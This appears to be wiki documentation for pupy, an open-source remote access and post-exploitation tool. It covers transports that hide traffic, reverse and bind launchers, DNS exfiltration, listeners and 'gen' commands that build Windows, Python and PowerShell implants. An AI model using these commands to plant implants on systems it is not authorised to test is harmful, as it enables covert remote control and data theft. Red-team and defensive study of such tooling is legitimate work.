
## Run the server
Once you have [correctly](https://github.com/n1nj4sec/pupy/wiki/Installation) installed pupy, you are ready to launch the server.
```code
pupysh
```

To generate working payloads, you should have a complete comprehension of how things work. `transports`, `launchers`, `listeners` and `payloads` terms have to be understood before starting.  

## Transport

All transports in pupy are stackable. This mean that by creating a custom
transport conf (pupy/network/transport/<transport_name>/conf.py), you can make
you pupy session looks like anything. For example you could stack HTTP over
HTTP over base64 over HTTP over AES over obfs3 :o)

- ```ssl``` (the default one): TCP transport wrapped with SSL.
- ```rsa```: Authentication & encryption using RSA and AES256, often stacked with other layers.
- ```ssl_rsa```: Same as ssl but stacked with a rsa layer.
- ```websocket```: Take a look of this [article](https://bitrot.sh/post/28-11-2017-pupy-websocket-transport/).
- ```aes```: Use of a static AES256 key.
- ```http```: Making the traffic looking like basic HTTP + stacked with a rsa layer.
- ```obfs3```: [A protocol to keep a third party from telling what protocol is in use based on message contents](https://gitweb.torproject.org/pluggable-transports/obfsproxy.git/tree/doc/obfs3/obfs3-protocol-spec.txt). Obfs3 is stacked with a rsa layer for a better security
- ```scramblesuit```: [A Polymorphic Network Protocol to Circumvent Censorship](http://www.cs.kau.se/philwint/scramblesuit/). Scramblesuit is stacked with a rsa layer for a better security.
- ```udp```: Rsa layer but over UDP (could be buggy, it doesn't handle packet loss yet).
- other: Layers without really interest and are given for code examples : (dummy, base64, XOR, ...).

## Launchers

Launchers allow pupy to run custom actions before starting the reverse connection
- ```connect```: Connect back to our server.
- ```bind```: Bind payload instead of reverse
- ```auto_proxy```: Retrieve a list of possible SOCKS/HTTP proxies and try each one of them. Proxy retrieval methods are: registry, WPAD requests, gnome settings, HTTP_PROXY env variable
- ```dnscnc```: DNS exfiltration

## Listeners

By default, it tries to listen on port 443 using the ssl transport. This configuration can be changed on the `pupy.conf` file.
To add listeners on `pupysh`, use `listen` as following: 
```
>> listen -a <transport> <port>
```

   - Exemple: 
```
>> listen -a ssl 8443
[+] Listen: ssl: 8443
```

## Payloads format

Payloads format represent the way to build our payload. Some are implemented and you should use one depending on the context and system you are targeting: 

- ```client```: executable to run on the target (.exe, .dll, .lin, .so).
- ```py```: python file.
- ```pyinst```: python file ready to be used with [pyinstaller](https://github.com/pyinstaller/pyinstaller).
- ```py_oneliner```: python oneliner (start a listening server on background)
- ```ps1```: powershell file. 
- ```ps1_oneliner```: powershell oneliner (start a listening server on background).
- ```rubber_ducky```: useful with rubber ducky.

## Payloads Generation

**Oneliners**: For one shot usage use `gen` command inside `pupysh`. Once you get the session back, kill the server using `CTRL-C`. If you want to let the server running non stop, use `pupygen.py` using exactly the same syntax as explained below.  

Payloads generation are done using the `gen` command. 
```
>> gen -f <format> <launcher> -t <transport>
```
Here are some examples: 

- Windows dll
```
>> gen -S -f client -O windows -A x64 connect --host ip:port -t transport
```

- Windows executable
```
>> gen -f client -O windows -A x64 connect --host ip:port -t transport
```

- Python file - Bind
```
>> gen -f py bind --port port -t transport
```

- Python oneliner
```
>> gen -f py_oneliner connect --host ip:port -t transport
```
